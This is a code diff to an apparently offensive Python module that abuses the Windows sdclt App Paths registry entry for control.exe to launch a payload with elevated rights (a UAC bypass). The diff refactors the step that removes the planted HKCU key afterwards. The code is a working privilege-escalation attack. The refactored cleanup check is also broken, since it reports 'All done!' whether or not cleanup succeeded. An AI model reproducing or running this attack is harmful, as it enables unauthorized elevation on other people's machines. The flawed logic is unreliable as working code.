@@ -16,6 +16,14 @@ sdcltcontrol_info = {
 }
 
 
+def sdclt_control_cleanup(path):
+	print_info("Performing cleaning")
+	if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=False):
+		print_success("Successfully cleaned up")
+	else:
+		print_error("Unable to cleanup")
+		return False
+		
 def sdclt_control(payload):
 	if payloads().exe(payload):
 		path = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe"
@@ -35,15 +43,13 @@ def sdclt_control(payload):
 				print_success("Successfully spawned process ({})".format(payload))
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
-				return False
+				if "error" in Constant.output:
+					sdclt_control_cleanup(path)
 
 		time.sleep(5)
 
-		if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=False):
-			print_success("Successfully cleaned up, enjoy!")
-		else:
-			print_error("Unable to cleanup")
-			return False
+		if not sdclt_control_cleanup(path):
+			print_success("All done!")
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
